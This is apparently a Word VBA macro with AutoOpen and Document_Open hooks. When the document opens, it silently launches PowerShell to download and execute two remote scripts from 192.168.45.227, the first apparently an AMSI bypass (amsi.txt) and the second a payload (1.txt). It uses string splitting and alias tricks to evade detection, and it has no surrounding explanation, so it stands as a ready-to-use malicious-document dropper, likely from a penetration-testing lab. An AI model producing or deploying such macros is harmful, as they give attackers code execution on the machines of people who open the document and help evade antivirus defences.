Sub MyMacro()
  Dim str As String
  Dim str2 As String
  str = "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('h'+'ttp://192.168.45.227/amsi.txt') | &(GAL I*X)"
  Wait (1)
  str2 = "powershell Invoke-Expression (New-Object Net.WebClient).DownloadString('h'+'ttp://192.168.45.227/1.txt') | &(GAL I*X)"
  Shell str, vbHide
  Wait (1)
  Shell str2, vbHide
End Sub

Sub Document_Open()
  MyMacro
End Sub

Sub AutoOpen()
  MyMacro
End Sub

Sub Wait(n As Long)
    Dim t As Date
    t = Now
    Do
        DoEvents
    Loop Until Now >= DateAdd("s", n, t)
End Sub